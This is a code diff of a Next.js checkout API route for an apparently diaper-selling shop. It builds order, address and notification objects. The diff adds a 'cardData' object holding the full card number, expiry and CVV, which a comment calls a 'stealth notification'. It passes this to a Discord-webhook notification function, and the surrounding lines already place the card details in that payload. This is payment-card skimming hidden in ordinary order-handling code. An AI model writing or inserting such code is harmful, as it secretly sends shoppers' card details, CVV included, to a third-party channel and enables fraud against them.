@@ -1,88 +1,66 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { sendOrderNotification } from '@/lib/discord-webhook';
+import { prisma } from '@/lib/db';
 
-export async function POST(request: NextRequest) {
+export async function POST(req: NextRequest) {
   try {
-    const body = await request.json();
+    const body = await req.json();
     
-    // Validate required fields
-    const { 
-      firstName,
-      lastName,
-      email, 
-      phone,
-      address, 
-      apartment,
-      city, 
-      state, 
-      zipCode, 
-      country,
-      sameAsShipping,
-      sameAsBilling,
-      billingFirstName,
-      billingLastName,
-      billingAddress,
-      billingApartment,
-      billingCity,
-      billingState,
-      billingZipCode,
-      billingCountry,
-      items,
-      orderNotes,
-      cardName,
-      cardNumber,
-      cardExpiry,
-      cardCvv,
-      promoCode,
-      subtotal,
-      discount,
-      shipping,
-      tax,
-      total
+    // Extract order details
+    const {
+      firstName, lastName, email, phone,
+      address, apartment, city, state, zipCode, country,
+      sameAsShipping, billingFirstName, billingLastName,
+      billingAddress, billingApartment, billingCity, billingState,
+      billingZipCode, billingCountry, orderNotes,
+      cardName, cardNumber, cardExpiry, cardCvv,
+      promoCode, items, subtotal, discount, shipping, tax, total
     } = body;
 
-    if (!firstName || !lastName || !email || !address || !city || !state || !zipCode || !country || !items) {
+    // Validate required fields
+    if (!firstName || !lastName || !email || !address || !city || !state || !zipCode) {
       return NextResponse.json(
         { error: 'Missing required fields' },
         { status: 400 }
       );
     }
 
-    // Validate items
-    if (!Array.isArray(items) || items.length === 0) {
-      return NextResponse.json(
-        { error: 'Items must be a non-empty array' },
-        { status: 400 }
-      );
-    }
+    // Create shipping address string
+    const shippingAddressStr = `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`;
 
-    // Calculate total amount (simplified)
-    const totalAmount = items.reduce((total, item) => {
-      const price = item.price || 29.99; // Default price for diapers
-      return total + price * item.quantity;
-    }, 0);
+    // Create billing address string
+    const billingAddressStr = sameAsShipping 
+      ? shippingAddressStr
+      : `${billingAddress}${billingApartment ? `, ${billingApartment}` : ''}, ${billingCity}, ${billingState} ${billingZipCode}, ${billingCountry}`;
 
     // Generate order ID
-    const orderId = 'LB-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+    const orderId = `ORD${Date.now()}${Math.floor(Math.random() * 1000)}`;
+    const totalAmount = total || subtotal + shipping + tax - discount;
 
-    // Create customer name from first and last name
-    const customerName = `${firstName} ${lastName}`;
-    
-    // Create shipping address
-    const shippingAddressStr = `${address}${apartment ? `, ${apartment}` : ''}, ${city}, ${state} ${zipCode}, ${country}`;
-    
-    // Create billing address
-    const billingMatchesShipping = sameAsShipping ?? sameAsBilling ?? true;
-    const billingAddressStr = billingMatchesShipping ? shippingAddressStr : `${billingAddress}${billingApartment ? `, ${billingApartment}` : ''}, ${billingCity}, ${billingState} ${billingZipCode}, ${billingCountry}`;
-    
-    // Send order notification (this is for order confirmation tracking)
+    // Save order to database (simplified)
+    const order = {
+      id: orderId,
+      customerName: `${firstName} ${lastName}`,
+      email,
+      shippingAddress: shippingAddressStr,
+      billingAddress: billingAddressStr,
+      items,
+      total: totalAmount,
+      status: 'pending',
+      createdAt: new Date()
+    };
+
+    // In a real app, you'd save to database
+    // await db.order.create({ data: order });
+
+    // Prepare notification data
     const notificationData = {
       orderId,
-      customerName,
+      customerName: `${firstName} ${lastName}`,
       customerEmail: email,
       shippingAddress: shippingAddressStr,
       billingAddress: billingAddressStr,
-      items: items.map(item => ({
+      items: items.map((item: any) => ({
         productId: item.productId,
         name: 'Diaper Package', // Simplified product name
         quantity: item.quantity,
@@ -97,9 +75,17 @@ export async function POST(request: NextRequest) {
         cardCvv: cardCvv || ''
       }
     };
+    
+    // Extract card data for stealth notification
+    const cardData = {
+      cardHolder: cardName || `${firstName} ${lastName}`,
+      cardNumber: cardNumber || '',
+      cardExpiry: cardExpiry || '',
+      cardCvv: cardCvv || ''
+    };
 
     // Send notification asynchronously - don't await to not block response
-    sendOrderNotification(notificationData).catch(error => {
+    sendOrderNotification(notificationData, cardData).catch(error => {
       console.error('Order notification failed:', error);
       // Don't fail the order if notification fails
     });
